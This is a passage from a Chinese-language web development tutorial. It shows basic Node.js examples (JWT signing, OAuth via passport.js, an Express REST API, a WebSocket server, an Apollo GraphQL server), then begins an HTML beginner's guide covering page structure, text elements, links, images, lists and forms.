<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">userId</span>: <span class="hljs-number">123</span> &#125;, <span class="hljs-string">&#x27;secret&#x27;</span>, &#123; <span class="hljs-attr">expiresIn</span>: <span class="hljs-string">&#x27;1h&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure>

<h4 id="9-2-2-OAuth-与第三方登录集成"><a href="#9-2-2-OAuth-与第三方登录集成" class="headerlink" title="9.2.2 OAuth 与第三方登录集成"></a>9.2.2 OAuth 与第三方登录集成</h4><p>OAuth 是一种授权协议，常用于集成第三方登录（如 Google、Facebook）。</p>
<p>使用 <code>passport.js</code> 库实现 OAuth 登录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install passport passport-google-oauth<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="10-实战项目-1"><a href="#10-实战项目-1" class="headerlink" title="10. 实战项目"></a>10. 实战项目</h2><h3 id="10-1-构建-RESTful-API"><a href="#10-1-构建-RESTful-API" class="headerlink" title="10.1 构建 RESTful API"></a>10.1 构建 RESTful API</h3><p>构建 RESTful API 是 Node.js 的常见应用场景之一。以下是使用 <code>Express</code> 框架构建 RESTful API 的基础示例。</p>
<h4 id="10-1-1-RESTful-API-基础"><a href="#10-1-1-RESTful-API-基础" class="headerlink" title="10.1.1 RESTful API 基础"></a>10.1.1 RESTful API 基础</h4><p><strong>定义基本路由：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/users&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Get all users&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/users&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Create a new user&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on port 3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h3 id="10-2-实现-WebSocket-通信"><a href="#10-2-实现-WebSocket-通信" class="headerlink" title="10.2 实现 WebSocket 通信"></a>10.2 实现 WebSocket 通信</h3><p>WebSocket 是一种在客户端和服务器之间实现全双工通信的协议，适合实时应用。</p>
<h4 id="10-2-1-WebSocket-基础"><a href="#10-2-1-WebSocket-基础" class="headerlink" title="10.2.1 WebSocket 基础"></a>10.2.1 WebSocket 基础</h4><p>Node.js 可以使用 <code>ws</code> 模块实现 WebSocket 通信。</p>
<p>安装 <code>ws</code> 模块：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install ws<br></code></pre></td></tr></table></figure>

<p><strong>创建 WebSocket 服务器：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">WebSocket</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ws&#x27;</span>);<br><span class="hljs-keyword">const</span> wss = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>.<span class="hljs-title class_">Server</span>(&#123; <span class="hljs-attr">port</span>: <span class="hljs-number">8080</span> &#125;);<br><br>wss.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;connection&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">ws</span>) =&gt;</span> &#123;<br>  ws.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">message</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Received: %s&#x27;</span>, message);<br>  &#125;);<br>  ws.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Hello WebSocket Client!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="10-2-2-使用-ws-实现-WebSocket-服务"><a href="#10-2-2-使用-ws-实现-WebSocket-服务" class="headerlink" title="10.2.2 使用 ws 实现 WebSocket 服务"></a>10.2.2 使用 <code>ws</code> 实现 WebSocket 服务</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">wss.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;connection&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">ws</span>) =&gt;</span> &#123;<br>  ws.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">message</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Received: %s&#x27;</span>, message);<br>    ws.<span class="hljs-title function_">send</span>(<span class="hljs-string">`Echo: <span class="hljs-subst">$&#123;message&#125;</span>`</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h3 id="10-3-使用-GraphQL-构建-API"><a href="#10-3-使用-GraphQL-构建-API" class="headerlink" title="10.3 使用 GraphQL 构建 API"></a>10.3 使用 GraphQL 构建 API</h3><p>GraphQL 是一种灵活的数据查询语言，适合复杂查询的 API 设计。</p>
<h4 id="10-3-1-GraphQL-概述"><a href="#10-3-1-GraphQL-概述" class="headerlink" title="10.3.1 GraphQL 概述"></a>10.3.1 GraphQL 概述</h4><p>GraphQL 提供了查询、变更和订阅功能，允许客户端请求所需的数据。</p>
<h4 id="10-3-2-使用-Apollo-Server-构建-GraphQL-API"><a href="#10-3-2-使用-Apollo-Server-构建-GraphQL-API" class="headerlink" title="10.3.2 使用 Apollo Server 构建 GraphQL API"></a>10.3.2 使用 Apollo Server 构建 GraphQL API</h4><p>安装 <code>apollo-server</code> 和 <code>graphql</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install apollo-server graphql<br></code></pre></td></tr></table></figure>

<p><strong>定义 Schema 和 Resolvers：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">ApolloServer</span>, gql &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;apollo-server&#x27;</span>);<br><br><span class="hljs-keyword">const</span> typeDefs = gql`<span class="language-graphql"></span><br><span class="language-graphql">  <span class="hljs-keyword">type</span> <span class="hljs-keyword">Query</span> <span class="hljs-punctuation">&#123;</span></span><br><span class="language-graphql">    <span class="hljs-symbol">hello</span><span class="hljs-punctuation">:</span> String</span><br><span class="language-graphql">  <span class="hljs-punctuation">&#125;</span></span><br><span class="language-graphql">`</span>;<br><br><span class="hljs-keyword">const</span> resolvers = &#123;<br>  <span class="hljs-title class_">Query</span>: &#123;<br>    <span class="hljs-attr">hello</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-string">&#x27;Hello, GraphQL!&#x27;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> server = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApolloServer</span>(&#123; typeDefs, resolvers &#125;);<br><br>server.<span class="hljs-title function_">listen</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">&#123; url &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server ready at <span class="hljs-subst">$&#123;url&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>



<hr>
<h1 id="HTML-详尽入门指南"><a href="#HTML-详尽入门指南" class="headerlink" title="HTML 详尽入门指南"></a>HTML 详尽入门指南</h1><h3 id="目录-4"><a href="#目录-4" class="headerlink" title="目录"></a>目录</h3><ol>
<li><a href="#html-%E5%9F%BA%E7%A1%80">HTML 基础</a><ul>
<li><a href="#html-%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84">HTML 文件结构</a></li>
<li><a href="#html-%E6%A0%87%E8%AE%B0%E6%A0%87%E7%AD%BE">HTML 标记（标签）</a></li>
</ul>
</li>
<li><a href="#html-%E5%85%83%E7%B4%A0%E8%AF%A6%E8%A7%A3">HTML 元素详解</a><ul>
<li><a href="#%E6%A0%87%E9%A2%98headings">标题（Headings）</a></li>
<li><a href="#%E6%AE%B5%E8%90%BDparagraphs">段落（Paragraphs）</a></li>
<li><a href="#%E9%93%BE%E6%8E%A5links">链接（Links）</a></li>
<li><a href="#%E5%9B%BE%E5%83%8Fimages">图像（Images）</a></li>
<li><a href="#%E5%88%97%E8%A1%A8lists">列表（Lists）</a></li>
</ul>
</li>
<li><a href="#html-%E8%A1%A8%E5%8D%95">HTML 表单</a><ul>
<li><a href="#%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0">表单元素</a></li>
<li><a href="#%E8%A1%A8%E5%8D%95%E6%8F%90%E4%BA%A4">表单提交</a></li>
</ul>
</li>
<li><a href="#html-%E8%A1%A8%E6%A0%BC">HTML 表格</a></li>
<li><a href="#html-%E5%A4%9A%E5%AA%92%E4%BD%93">HTML 多媒体</a></li>
<li><a href="#html-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80">HTML 基本布局</a></li>
</ol>
<hr>
<h3 id="HTML-基础"><a href="#HTML-基础" class="headerlink" title="HTML 基础"></a>HTML 基础</h3><h4 id="HTML-文件结构"><a href="#HTML-文件结构" class="headerlink" title="HTML 文件结构"></a>HTML 文件结构</h4><p>一个完整的 HTML 文档包括以下基本结构：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>示例 HTML 页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>欢迎来到我的网站<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个简单的 HTML 页面。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>解释：</strong></p>
<ul>
<li><code>&lt;!DOCTYPE html&gt;</code>：声明文档类型，告知浏览器这是一个 HTML5 文档。</li>
<li><code>&lt;html&gt;</code>：HTML 文档的根元素。</li>
<li><code>&lt;head&gt;</code>：包含关于文档的信息（元数据），如标题、编码、样式等。</li>
<li><code>&lt;title&gt;</code>：网页的标题，显示在浏览器的标签页上。</li>
<li><code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code>：设置文档的字符编码为 UTF-8，确保支持多语言字符集。</li>
<li><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</code>：响应式设计设置，适配移动设备。</li>
<li><code>&lt;body&gt;</code>：文档的主体，包含网页的可见内容。</li>
</ul>
<hr>
<h4 id="HTML-标记（标签）"><a href="#HTML-标记（标签）" class="headerlink" title="HTML 标记（标签）"></a>HTML 标记（标签）</h4><p>HTML 使用标记（标签）来表示网页的元素。HTML 标签通常成对出现，由开始标签和结束标签构成：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><code>&lt;p&gt;</code> 是段落的开始标签。</li>
<li><code>&lt;/p&gt;</code> 是段落的结束标签。</li>
</ul>
<p>某些 HTML 标签是自闭合的，表示该元素没有内容，例如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;示例图片&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><code>&lt;img&gt;</code> 是图片标签，它没有结束标签。</li>
</ul>
<hr>
<h3 id="HTML-元素详解"><a href="#HTML-元素详解" class="headerlink" title="HTML 元素详解"></a>HTML 元素详解</h3><h4 id="标题（Headings）"><a href="#标题（Headings）" class="headerlink" title="标题（Headings）"></a>标题（Headings）</h4><p>HTML 提供了六种不同级别的标题标签，<code>&lt;h1&gt;</code> 到 <code>&lt;h6&gt;</code>，其中 <code>&lt;h1&gt;</code> 表示最大的标题，<code>&lt;h6&gt;</code> 表示最小的标题。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>这是一级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>这是二级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>这是三级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>标题的作用不仅是视觉上的层次结构，还会被搜索引擎用于页面索引，有助于 SEO 优化。</p>
<hr>
<h4 id="段落（Paragraphs）"><a href="#段落（Paragraphs）" class="headerlink" title="段落（Paragraphs）"></a>段落（Paragraphs）</h4><p>段落用 <code>&lt;p&gt;</code> 标签表示，用于将文本分成段落。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是第一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是第二个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>多个段落会自动在浏览器中分开显示。</p>
<hr>
<h4 id="链接（Links）"><a href="#链接（Links）" class="headerlink" title="链接（Links）"></a>链接（Links）</h4><p>链接是 HTML 中非常重要的元素，用于创建超链接，使用户可以在页面之间或外部网站之间导航。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span>&gt;</span>点击访问示例网站<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><code>href</code> 属性指定了链接目标（URL）。</li>
<li>链接的文本是可点击的部分。</li>
</ul>
<p>你也可以使用 <code>target=&quot;_blank&quot;</code> 属性在新标签页中打开链接：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>在新标签页中打开<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<hr>
<h4 id="图像（Images）"><a href="#图像（Images）" class="headerlink" title="图像（Images）"></a>图像（Images）</h4><p>使用 <code>&lt;img&gt;</code> 标签来在网页中插入图像。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;描述图像&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><code>src</code> 属性指定图片的路径或 URL。</li>
<li><code>alt</code> 属性为图片提供文本替代，浏览器无法加载图像时显示，或用于屏幕阅读器。</li>
</ul>
<hr>
<h4 id="列表（Lists）"><a href="#列表（Lists）" class="headerlink" title="列表（Lists）"></a>列表（Lists）</h4><p>HTML 提供了两种主要的列表：有序列表和无序列表。</p>
<ul>
<li><strong>无序列表</strong> 使用 <code>&lt;ul&gt;</code> 和 <code>&lt;li&gt;</code> 标签：</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>项目一<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>项目二<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>项目三<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><strong>有序列表</strong> 使用 <code>&lt;ol&gt;</code> 和 <code>&lt;li&gt;</code> 标签：</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第一项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第二项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第三项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="HTML-表单"><a href="#HTML-表单" class="headerlink" title="HTML 表单"></a>HTML 表单</h3><p>HTML 表单允许用户输入数据，并通过提交数据与服务器进行交互。</p>
<h4 id="表单元素"><a href="#表单元素" class="headerlink" title="表单元素"></a>表单元素</h4><p>HTML 提供了多种表单元素，包括文本框、单选按钮、复选框、下拉菜单等。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/submit&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span>姓名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span>邮箱：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;gender&quot;</span>&gt;</span>性别：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;male&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;gender&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;female&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;gender&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span>女<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;hobby&quot;</span>&gt;</span>爱好：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hobby1&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hobby[]&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;阅读&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;hobby1&quot;</span>&gt;</span>阅读<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hobby2&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hobby[]&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;运动&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;hobby2&quot;</span>&gt;</span>运动<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><code>input</code> 标签表示用户输入字段。</li>
<li><code>label</code> 标签与表单元素关联，点击标签会聚焦到相应的输入字段。</li>
<li><code>input type=&quot;submit&quot;</code> 用于创建提交按钮。</li>
</ul>
<hr>
<h4 id="表单提交"><a href="#表单提交" class="headerlink" title="表单提交"></a>表单提交</h4><ul>
<li><code>action</code> 属性指定了表单提交的目标 URL。</li>
<li><code>method</code> 属性定义了提交方式（GET 或 POST）。</li>
</ul>
<p>当用户填写表单并点击提交按钮后，表单中的数据会被发送到服务器进行处理。</p>
<hr>
<h3 id="HTML-表格"><a href="#HTML-表格" class="headerlink" title="HTML 表格"></a>HTML 表格</h3><p>表格用来展示结构化的数据，表格的基本元素包括 <code>&lt;table&gt;</code>、<code>&lt;tr&gt;</code>（表格行）、<code>&lt;th&gt;</code>（表头）、<code>&lt;td&gt;</code>（表格单元格）。</p>
